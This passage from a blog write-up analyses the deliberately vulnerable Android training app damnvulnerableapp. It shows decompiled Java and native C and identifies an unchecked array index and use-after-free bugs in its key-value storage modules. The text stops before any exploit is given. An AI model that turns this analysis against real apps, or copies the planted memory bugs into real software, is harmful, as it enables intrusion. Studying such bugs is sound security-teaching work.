&lt;h2 id="assumptions">Assumptions&lt;/h2>
&lt;p>We will assume that we have successfully grabbed a copy of the &lt;code>.apk&lt;/code> file of &lt;em>damnvulnerableapp&lt;/em>. Also, we will &lt;strong>not&lt;/strong> discuss how to unpack an &lt;code>.apk&lt;/code> file, but rather assume that we have access to &lt;code>libUseAfterFree(Exec/Write)Module.so&lt;/code> and the &lt;code>UseAfterFree(Exec/Write)Module&lt;/code> class. If it is unclear how to get access to these components when only given an &lt;code>.apk&lt;/code> file, read the previous blog posts first!&lt;/p>
&lt;h2 id="analysis-baseline">Analysis baseline&lt;/h2>
&lt;p>As we have access to the &lt;code>.apk&lt;/code> file, we can utilize &lt;a href="https://github.com/skylot/jadx">&lt;em>jadx&lt;/em>&lt;/a> to get the source code of &lt;code>UseAfterFreeExecModule&lt;/code>:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-Java" data-lang="Java">&lt;span style="color:#75715e">/* loaded from: classes10.dex */&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">UseAfterFreeExecModule&lt;/span> &lt;span style="color:#66d9ef">extends&lt;/span> VulnerableModule &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">private&lt;/span> &lt;span style="color:#66d9ef">native&lt;/span> &lt;span style="color:#66d9ef">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#a6e22e">lookupExamples&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#66d9ef">int&lt;/span> i&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#66d9ef">private&lt;/span> &lt;span style="color:#66d9ef">native&lt;/span> &lt;span style="color:#66d9ef">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#a6e22e">storePair&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#66d9ef">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> bArr&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span> j&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
System&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">loadLibrary&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;UseAfterFreeExecModule&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#a6e22e">UseAfterFreeExecModule&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">super&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#66d9ef">new&lt;/span> UseAfterFreeExecModuleConfiguration&lt;span style="color:#f92672">());&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#a6e22e">@Override&lt;/span> &lt;span style="color:#75715e">// com.damnvulnerableapp.vulnerable.modules.VulnerableModule
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#66d9ef">throws&lt;/span> VulnerableModuleException &lt;span style="color:#f92672">{&lt;/span>
output&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;Key - Value Storage! Most secure in this field!&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getBytes&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;span style="color:#66d9ef">while&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#66d9ef">true&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
output&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;Send a number between 1 and 4 (0 to continue) to see one of four key name templates:&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getBytes&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;span style="color:#66d9ef">int&lt;/span> index &lt;span style="color:#f92672">=&lt;/span> ByteBuffer&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">wrap&lt;/span>&lt;span style="color:#f92672">(&lt;/span>input&lt;span style="color:#f92672">()).&lt;/span>&lt;span style="color:#a6e22e">getInt&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>index &lt;span style="color:#f92672">==&lt;/span> 0&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">break&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
output&lt;span style="color:#f92672">(&lt;/span>lookupExamples&lt;span style="color:#f92672">(&lt;/span>index &lt;span style="color:#f92672">-&lt;/span> 1&lt;span style="color:#f92672">));&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#66d9ef">while&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#66d9ef">true&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
output&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;Please provide the key name (EXIT to end app): &amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getBytes&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;span style="color:#66d9ef">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> name &lt;span style="color:#f92672">=&lt;/span> input&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#66d9ef">new&lt;/span> String&lt;span style="color:#f92672">(&lt;/span>name&lt;span style="color:#f92672">).&lt;/span>&lt;span style="color:#a6e22e">toUpperCase&lt;/span>&lt;span style="color:#f92672">(&lt;/span>Locale&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">ROOT&lt;/span>&lt;span style="color:#f92672">).&lt;/span>&lt;span style="color:#a6e22e">equals&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;EXIT&amp;#34;&lt;/span>&lt;span style="color:#f92672">))&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
output&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;Terminating...&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getBytes&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;span style="color:#66d9ef">return&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
output&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;Please provide the key value: &amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getBytes&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;span style="color:#66d9ef">long&lt;/span> value &lt;span style="color:#f92672">=&lt;/span> ByteBuffer&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">wrap&lt;/span>&lt;span style="color:#f92672">(&lt;/span>input&lt;span style="color:#f92672">()).&lt;/span>&lt;span style="color:#a6e22e">getLong&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#66d9ef">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> result &lt;span style="color:#f92672">=&lt;/span> storePair&lt;span style="color:#f92672">(&lt;/span>name&lt;span style="color:#f92672">,&lt;/span> value&lt;span style="color:#f92672">);&lt;/span>
output&lt;span style="color:#f92672">(&lt;/span>result&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>and &lt;code>UseAfterFreeWriteModule&lt;/code>:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-Java" data-lang="Java">&lt;span style="color:#75715e">/* loaded from: classes10.dex */&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">UseAfterFreeWriteModule&lt;/span> &lt;span style="color:#66d9ef">extends&lt;/span> VulnerableModule &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">private&lt;/span> &lt;span style="color:#66d9ef">native&lt;/span> &lt;span style="color:#66d9ef">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#a6e22e">lookupExamples&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#66d9ef">int&lt;/span> i&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#66d9ef">private&lt;/span> &lt;span style="color:#66d9ef">native&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">storePair&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#66d9ef">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> bArr&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span> j&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
System&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">loadLibrary&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;UseAfterFreeWriteModule&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#a6e22e">UseAfterFreeWriteModule&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">super&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#66d9ef">new&lt;/span> UseAfterFreeWriteModuleConfiguration&lt;span style="color:#f92672">());&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#a6e22e">@Override&lt;/span> &lt;span style="color:#75715e">// com.damnvulnerableapp.vulnerable.modules.VulnerableModule
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#66d9ef">throws&lt;/span> VulnerableModuleException &lt;span style="color:#f92672">{&lt;/span>
output&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;Key - Value Storage! Most secure in this field!&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getBytes&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;span style="color:#66d9ef">while&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#66d9ef">true&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
output&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;Send a number between 1 and 4 (0 to continue) to see one of four key name templates:&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getBytes&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;span style="color:#66d9ef">int&lt;/span> index &lt;span style="color:#f92672">=&lt;/span> ByteBuffer&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">wrap&lt;/span>&lt;span style="color:#f92672">(&lt;/span>input&lt;span style="color:#f92672">()).&lt;/span>&lt;span style="color:#a6e22e">getInt&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>index &lt;span style="color:#f92672">==&lt;/span> 0&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">break&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
output&lt;span style="color:#f92672">(&lt;/span>lookupExamples&lt;span style="color:#f92672">(&lt;/span>index &lt;span style="color:#f92672">-&lt;/span> 1&lt;span style="color:#f92672">));&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#66d9ef">while&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#66d9ef">true&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
output&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;Please provide the key name (EXIT to end app): &amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getBytes&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;span style="color:#66d9ef">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> name &lt;span style="color:#f92672">=&lt;/span> input&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#66d9ef">new&lt;/span> String&lt;span style="color:#f92672">(&lt;/span>name&lt;span style="color:#f92672">).&lt;/span>&lt;span style="color:#a6e22e">toUpperCase&lt;/span>&lt;span style="color:#f92672">(&lt;/span>Locale&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">ROOT&lt;/span>&lt;span style="color:#f92672">).&lt;/span>&lt;span style="color:#a6e22e">equals&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;EXIT&amp;#34;&lt;/span>&lt;span style="color:#f92672">))&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
output&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;Terminating...&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getBytes&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;span style="color:#66d9ef">return&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
output&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;Please provide the key value: &amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getBytes&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;span style="color:#66d9ef">long&lt;/span> value &lt;span style="color:#f92672">=&lt;/span> ByteBuffer&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">wrap&lt;/span>&lt;span style="color:#f92672">(&lt;/span>input&lt;span style="color:#f92672">()).&lt;/span>&lt;span style="color:#a6e22e">getLong&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
storePair&lt;span style="color:#f92672">(&lt;/span>name&lt;span style="color:#f92672">,&lt;/span> value&lt;span style="color:#f92672">);&lt;/span>
output&lt;span style="color:#f92672">((&lt;/span>&lt;span style="color:#e6db74">&amp;#34;Successfully stored (&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> String&lt;span style="color:#f92672">(&lt;/span>name&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#34;:&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> value &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#34;)!&amp;#34;&lt;/span>&lt;span style="color:#f92672">).&lt;/span>&lt;span style="color:#a6e22e">getBytes&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>In both cases, we can see that:&lt;/p>
&lt;ol>
&lt;li>An arbitrary amount of integers can be passed to &lt;code>lookupExamples&lt;/code>. There seem to be &lt;strong>no bounds checks&lt;/strong>!&lt;/li>
&lt;li>An arbitrary amount of &lt;em>key - value&lt;/em> pairs can be stored using &lt;code>storePair&lt;/code>. Notice that the &lt;em>value&lt;/em> is an 8 - byte integer.&lt;/li>
&lt;/ol>
&lt;p>Now, for the shared - object files we can use &lt;a href="https://ghidra-sre.org/">&lt;em>Ghidra&lt;/em>&lt;/a>. Starting with &lt;code>libUseAfterFreeExecModule.so&lt;/code> yields the (already beautified) code:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-C" data-lang="C">jbyteArray
&lt;span style="color:#a6e22e">Java_com_damnvulnerableapp_vulnerable_modules_UseAfterFreeExecModule_lookupExamples&lt;/span>
(JNIEnv &lt;span style="color:#f92672">*&lt;/span>env, jobject this, jint index)
{
&lt;span style="color:#66d9ef">long&lt;/span> lVar1;
undefined4 length;
jbyteArray array;
&lt;span style="color:#66d9ef">long&lt;/span> in_FS_OFFSET;
&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>examples [&lt;span style="color:#ae81ff">4&lt;/span>];
canary &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">*&lt;/span>(&lt;span style="color:#66d9ef">long&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)(in_FS_OFFSET &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0x28&lt;/span>);
examples[&lt;span style="color:#ae81ff">2&lt;/span>]._0_4_ &lt;span style="color:#f92672">=&lt;/span> PTR_s_topsecret_key_00101d40._0_4_;
examples[&lt;span style="color:#ae81ff">2&lt;/span>]._4_4_ &lt;span style="color:#f92672">=&lt;/span> PTR_s_topsecret_key_00101d40._4_4_;
examples[&lt;span style="color:#ae81ff">3&lt;/span>]._0_4_ &lt;span style="color:#f92672">=&lt;/span> PTR_s_a_very_very_long_key_with_fancy__00101d48._0_4_;
examples[&lt;span style="color:#ae81ff">3&lt;/span>]._4_4_ &lt;span style="color:#f92672">=&lt;/span> PTR_s_a_very_very_long_key_with_fancy__00101d48._4_4_;
examples[&lt;span style="color:#ae81ff">0&lt;/span>]._0_4_ &lt;span style="color:#f92672">=&lt;/span> PTR_s_amazing_key_00101d30._0_4_;
examples[&lt;span style="color:#ae81ff">0&lt;/span>]._4_4_ &lt;span style="color:#f92672">=&lt;/span> PTR_s_amazing_key_00101d30._4_4_;
examples[&lt;span style="color:#ae81ff">1&lt;/span>]._0_4_ &lt;span style="color:#f92672">=&lt;/span> PTR_s_secret_key_00101d38._0_4_;
examples[&lt;span style="color:#ae81ff">1&lt;/span>]._4_4_ &lt;span style="color:#f92672">=&lt;/span> PTR_s_secret_key_00101d38._4_4_;
length &lt;span style="color:#f92672">=&lt;/span> __strlen_chk(examples[(&lt;span style="color:#66d9ef">int&lt;/span>)index],&lt;span style="color:#ae81ff">0xffffffffffffffff&lt;/span>);
array &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#f92672">*&lt;/span>(&lt;span style="color:#f92672">*&lt;/span>env)&lt;span style="color:#f92672">-&amp;gt;&lt;/span>NewByteArray)(env,(jsize)length);
(&lt;span style="color:#f92672">*&lt;/span>(&lt;span style="color:#f92672">*&lt;/span>env)&lt;span style="color:#f92672">-&amp;gt;&lt;/span>SetByteArrayRegion)(env,array,&lt;span style="color:#ae81ff">0&lt;/span>,(jsize)length,(jbyte &lt;span style="color:#f92672">*&lt;/span>)(examples &lt;span style="color:#f92672">+&lt;/span> (&lt;span style="color:#66d9ef">int&lt;/span>)index));
&lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#f92672">*&lt;/span>(&lt;span style="color:#66d9ef">long&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)(in_FS_OFFSET &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0x28&lt;/span>) &lt;span style="color:#f92672">==&lt;/span> canary) {
&lt;span style="color:#66d9ef">return&lt;/span> array;
}
&lt;span style="color:#75715e">/* WARNING: Subroutine does not return */&lt;/span>
__stack_chk_fail();
}
jbyteArray
&lt;span style="color:#a6e22e">Java_com_damnvulnerableapp_vulnerable_modules_UseAfterFreeExecModule_storePair&lt;/span>
(JNIEnv &lt;span style="color:#f92672">*&lt;/span>env,jobject this,jbyteArray name,jlong value)
{
uint resultLength;
&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#f92672">*&lt;/span>obj;
object &lt;span style="color:#f92672">*&lt;/span>keyValue;
jsize nameLength;
jbyte &lt;span style="color:#f92672">*&lt;/span>nameBytes;
jbyteArray array;
&lt;span style="color:#66d9ef">long&lt;/span> in_FS_OFFSET;
uint len;
&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>result;
jboolean iscopy;
&lt;span style="color:#66d9ef">long&lt;/span> canary;
canary &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">*&lt;/span>(&lt;span style="color:#66d9ef">long&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)(in_FS_OFFSET &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0x28&lt;/span>);
obj &lt;span style="color:#f92672">=&lt;/span> malloc(&lt;span style="color:#ae81ff">0x108&lt;/span>);
&lt;span style="color:#f92672">*&lt;/span>(code &lt;span style="color:#f92672">**&lt;/span>)((&lt;span style="color:#66d9ef">long&lt;/span>)obj &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0x100&lt;/span>) &lt;span style="color:#f92672">=&lt;/span> FUN_00100c60;
free(obj);
keyValue &lt;span style="color:#f92672">=&lt;/span> (object &lt;span style="color:#f92672">*&lt;/span>)calloc(&lt;span style="color:#ae81ff">1&lt;/span>,&lt;span style="color:#ae81ff">0x108&lt;/span>);
nameLength &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#f92672">*&lt;/span>(&lt;span style="color:#f92672">*&lt;/span>env)&lt;span style="color:#f92672">-&amp;gt;&lt;/span>GetArrayLength)(env,name);
len &lt;span style="color:#f92672">=&lt;/span> (uint)nameLength;
&lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#ae81ff">0x100&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> len) {
len &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x100&lt;/span>;
}
iscopy &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;\0&amp;#39;&lt;/span>;
nameBytes &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#f92672">*&lt;/span>(&lt;span style="color:#f92672">*&lt;/span>env)&lt;span style="color:#f92672">-&amp;gt;&lt;/span>GetByteArrayElements)(env,name,&lt;span style="color:#f92672">&amp;amp;&lt;/span>iscopy);
__memcpy_chk(keyValue,nameBytes,len,&lt;span style="color:#ae81ff">0xffffffffffffffff&lt;/span>);
keyValue&lt;span style="color:#f92672">-&amp;gt;&lt;/span>value &lt;span style="color:#f92672">=&lt;/span> value;
result &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)(&lt;span style="color:#f92672">**&lt;/span>(code &lt;span style="color:#f92672">**&lt;/span>)((&lt;span style="color:#66d9ef">long&lt;/span>)obj &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0x100&lt;/span>))(keyValue,&lt;span style="color:#ae81ff">0&lt;/span>);
resultLength &lt;span style="color:#f92672">=&lt;/span> __strlen_chk(&lt;span style="color:#f92672">&amp;amp;&lt;/span>result,&lt;span style="color:#ae81ff">0xffffffffffffffff&lt;/span>);
array &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#f92672">*&lt;/span>(&lt;span style="color:#f92672">*&lt;/span>env)&lt;span style="color:#f92672">-&amp;gt;&lt;/span>NewByteArray)(env,(jsize)resultLength);
(&lt;span style="color:#f92672">*&lt;/span>(&lt;span style="color:#f92672">*&lt;/span>env)&lt;span style="color:#f92672">-&amp;gt;&lt;/span>SetByteArrayRegion)(env,array,&lt;span style="color:#ae81ff">0&lt;/span>,(jsize)resultLength,(jbyte &lt;span style="color:#f92672">*&lt;/span>)&lt;span style="color:#f92672">&amp;amp;&lt;/span>result);
(&lt;span style="color:#f92672">*&lt;/span>(&lt;span style="color:#f92672">*&lt;/span>env)&lt;span style="color:#f92672">-&amp;gt;&lt;/span>ReleaseByteArrayElements)(env,name,nameBytes,JNI_ABORT);
free(keyValue);
&lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#f92672">*&lt;/span>(&lt;span style="color:#66d9ef">long&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)(in_FS_OFFSET &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0x28&lt;/span>) &lt;span style="color:#f92672">==&lt;/span> canary) {
&lt;span style="color:#66d9ef">return&lt;/span> array;
}
&lt;span style="color:#75715e">/* WARNING: Subroutine does not return */&lt;/span>
__stack_chk_fail();
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>As &lt;code>UseAfterFreeExecModule#lookupExamples&lt;/code> and &lt;code>UseAfterFreeWriteModule#lookupExamples&lt;/code> are basically the same (verfiy if not convinced), we will only consider &lt;code>UseAfterFreeWriteModule#storePair&lt;/code>:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-C" data-lang="C">&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">Java_com_damnvulnerableapp_vulnerable_modules_UseAfterFreeWriteModule_storePair&lt;/span>
(JNIEnv &lt;span style="color:#f92672">*&lt;/span>env,jobject this,jarray key,jlong value)
{
jlong &lt;span style="color:#f92672">**&lt;/span>ptrList;
object &lt;span style="color:#f92672">*&lt;/span>keyValuePair;
jsize keyLength;
jbyte &lt;span style="color:#f92672">*&lt;/span>keyBytes;
&lt;span style="color:#66d9ef">long&lt;/span> in_FS_OFFSET;
uint reducedKeyLength;
jboolean iscopy;
&lt;span style="color:#66d9ef">long&lt;/span> canary;
canary &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">*&lt;/span>(&lt;span style="color:#66d9ef">long&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)(in_FS_OFFSET &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0x28&lt;/span>);
ptrList &lt;span style="color:#f92672">=&lt;/span> (jlong &lt;span style="color:#f92672">**&lt;/span>)malloc(&lt;span style="color:#ae81ff">0x108&lt;/span>);
free(ptrList);
keyValuePair &lt;span style="color:#f92672">=&lt;/span> (object &lt;span style="color:#f92672">*&lt;/span>)malloc(&lt;span style="color:#ae81ff">0x108&lt;/span>);
keyLength &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#f92672">*&lt;/span>(&lt;span style="color:#f92672">*&lt;/span>env)&lt;span style="color:#f92672">-&amp;gt;&lt;/span>GetArrayLength)(env,key);
reducedKeyLength &lt;span style="color:#f92672">=&lt;/span> (uint)keyLength;
&lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#ae81ff">0x100&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> reducedKeyLength) {
reducedKeyLength &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x100&lt;/span>;
}
iscopy &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;\0&amp;#39;&lt;/span>;
keyBytes &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#f92672">*&lt;/span>(&lt;span style="color:#f92672">*&lt;/span>env)&lt;span style="color:#f92672">-&amp;gt;&lt;/span>GetByteArrayElements)(env,key,&lt;span style="color:#f92672">&amp;amp;&lt;/span>iscopy);
__memcpy_chk(keyValuePair,keyBytes,reducedKeyLength,&lt;span style="color:#ae81ff">0xffffffffffffffff&lt;/span>);
&lt;span style="color:#f92672">**&lt;/span>ptrList &lt;span style="color:#f92672">=&lt;/span> value;
(&lt;span style="color:#f92672">*&lt;/span>(&lt;span style="color:#f92672">*&lt;/span>env)&lt;span style="color:#f92672">-&amp;gt;&lt;/span>ReleaseByteArrayElements)(env,key,keyBytes,&lt;span style="color:#ae81ff">2&lt;/span>);
free(keyValuePair);
